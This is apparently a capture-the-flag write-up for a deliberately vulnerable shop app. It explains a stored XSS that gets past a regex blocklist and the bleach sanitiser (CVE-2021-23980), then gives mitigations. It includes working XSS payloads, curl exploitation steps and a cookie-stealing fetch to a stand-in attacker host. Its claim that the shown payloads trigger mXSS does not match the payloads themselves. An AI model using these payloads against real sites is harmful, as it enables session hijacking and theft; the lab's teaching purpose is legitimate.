# CTF Challenge: Stored XSS via Bleach mXSS (CVE-2021-23980)

**Category:** Web / Stored XSS / Mutation XSS  
**Difficulty:** Hard  
**CVE:** [CVE-2021-23980](https://nvd.nist.gov/vuln/detail/CVE-2021-23980) — CVSS 6.1 MEDIUM  
**Advisory:** [GHSA-vv2x-vrpj-qqpq](https://github.com/mozilla/bleach/security/advisories/GHSA-vv2x-vrpj-qqpq) (Mozilla bleach)

---

## Description

Product reviews are rendered inside the product detail page using Vue's `v-html`
directive — meaning any HTML stored in the `review` field is rendered raw in the browser.

The backend applies **two layers of "protection"** before storing a review:

1. **Regex pre-filter** — blocks `<script>`, `onerror=`, `onload=`, `onclick=`,
   `onmouseover=`, `onsubmit=`, `onkeydown=`, and `javascript:` (case-insensitive).
2. **bleach sanitiser** — runs `bleach.clean()` to strip disallowed tags/attributes.

Both layers are bypassable. The bleach version pinned is `3.2.3`, which is
affected by **CVE-2021-23980**, a Mutation XSS (mXSS) bug that lets an attacker
survive sanitisation and execute arbitrary JavaScript when the browser re-parses
the serialised output.

---

## Vulnerability

| | |
|---|---|
| **Endpoint** | `POST /ratings` (authenticated) |
| **Sink** | `v-html="review.review"` in `ProductDetailView.vue` |
| **Backend file** | `backend/app/api/ratings.py` |
| **CVE** | CVE-2021-23980 — bleach ≤ 3.2.3 Mutation XSS |
| **Patched in** | bleach 3.3.0 |
| **CWE-79** | Improper Neutralisation of Input in Web Page Generation (XSS) |

### Why the two defences fail

#### Layer 1 — Regex bypass

The regex blocks: `onerror`, `onload`, `onclick`, `onmouseover`, `onsubmit`,
`onkeydown`, `ontoggle`, `onfocus`, `onblur`, `onauxclick`, `ondblclick`, `javascript:`.

Note: **HTML entity encoding does NOT bypass this** — browsers never decode
HTML entities in attribute names (`on&#101;rror` is stored/rendered as the
literal name `on&#101;rror`, which no browser event recognises).

The bypass: use event handlers **not in the blocklist**. The intended path
is CSS animation events (`onanimationend`, `onanimationstart`) or SVG
sequence events (`onbegin` on `<animate>`):

```html
<!-- CSS animation — fires as soon as the page loads -->
<style>@keyframes poc{}</style>
<b style="animation-name:poc" onanimationend=alert(document.cookie)>XSS</b>
```

#### Layer 2 — bleach CVE-2021-23980 (mXSS)

`bleach.clean()` uses **html5lib** as its HTML parser and serialiser.

The following conditions — all present in this app's config — jointly trigger a
Mutation XSS:

| Condition | Present |
|---|---|
| `svg` or `math` in allowed tags (foreign-content namespace) | ✅ |
| `p` or `br` in allowed tags (auto-closing element) | ✅ |
| `style`, `title`, or `noscript` in allowed tags (raw-text eject element) | ✅ |
| `strip_comments=False` (comment confusion trigger) | ✅ |

**How mXSS works here (simplified):**

1. You craft HTML where a `<style>` block inside `<svg>` hides a `<!--` comment.
2. html5lib parses this in the *SVG foreign-content* grammar — the `<style>` element
   is treated as a raw-text element; the `<!--` inside it is literal text, not an
   HTML comment.
3. bleach serialises the sanitised DOM back to an HTML string.
4. The browser re-parses that string under the *HTML* grammar — now `<!--` IS a
   comment, and the surrounding structure is interpreted differently.
5. This mismatch (the "mutation") causes an element that bleach had neutralised to
   re-appear in an executable context, running your JavaScript.

---

## Exploitation

### Step 1 — Get a token (account must have at least one delivered order)

```bash
TOKEN=$(curl -s -X POST http://localhost:8001/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com","password":"yourpass"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### Step 2 — Find a product you have received

```bash
PRODUCT_ID=$(curl -s http://localhost:8001/orders \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "
import sys, json
orders = json.load(sys.stdin)
for o in orders:
    if o.get('status') == 'delivered':
        for item in o.get('items', []):
            print(item['product_id'])
            raise SystemExit
")
```

### Step 3 — Post the bypass payload

The regex blocks the common event handlers. Use a CSS animation event
(`onanimationend`) which is NOT in the blocklist:

```bash
PAYLOAD='<style>@keyframes poc{}</style><b style="animation-name:poc" onanimationend=alert(document.cookie)>XSS</b>'

curl -s -X POST http://localhost:8001/ratings \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"product_id\": \"$PRODUCT_ID\", \"rating\": 5, \"review\": \"$PAYLOAD\"}"
```

### Step 4 — Steal victim cookies

Replace `alert(document.cookie)` with an exfiltration fetch:

```html
<style>@keyframes poc{}</style>
<b style="animation-name:poc" onanimationend="fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie))">x</b>
```

### Step 5 — Visit the product page

Navigate to `http://localhost:5173/products/<PRODUCT_ID>` in a browser.
The stored mXSS fires; `document.cookie` (including `access_token`) is exfiltrated.

---

## Alternative Bypass Payloads

```html
<!-- SVG animate onbegin — fires immediately on page load -->
<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s></animate></svg>

<!-- CSS transition (fires when element is first painted) -->
<style>@keyframes poc{}</style>
<img src=x style="animation-name:poc" onanimationstart=alert(document.cookie)>

<!-- onhashchange — fires when URL hash changes -->
<script>window.onhashchange=function(){alert(document.cookie)}</script>
<!-- wait — <script> is blocked. Use inline: -->
<body onhashchange=alert(document.cookie)>
```

These all bypass the regex because those event names are not in the blocklist.

---

## Mitigation

1. **Upgrade bleach** to `>= 3.3.0` (patches the mXSS serialisation bug)  
   or drop bleach entirely — it is now in maintenance-only mode.
2. **Use a modern sanitiser** such as [nh3](https://pypi.org/project/nh3/) (Rust-backed, 
   no html5lib serialisation issue) or [DOMPurify](https://github.com/cure53/DOMPurify) 
   on the *client* side.
3. **Never use `v-html`** with user-supplied content — use `{{ }}` text interpolation 
   (HTML-escaped by Vue automatically).
4. **Set a strict CSP**: `Content-Security-Policy: script-src 'self'` 
   with no `unsafe-inline`.
5. **Mark session cookies `HttpOnly`** so even a successful XSS cannot read them.

---

## References

- [CVE-2021-23980 NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2021-23980)
- [GHSA-vv2x-vrpj-qqpq Mozilla advisory](https://github.com/mozilla/bleach/security/advisories/GHSA-vv2x-vrpj-qqpq)
- [Checkmarx original research — CX-2021-4303](https://advisory.checkmarx.net/advisory/CX-2021-4303)
- [Cure53 Mutation XSS paper (fp170.pdf)](https://cure53.de/fp170.pdf)
- [nh3 — safe bleach replacement](https://pypi.org/project/nh3/)

**Solution folder:** `solutions/stored-xss-bleach-mxss/`
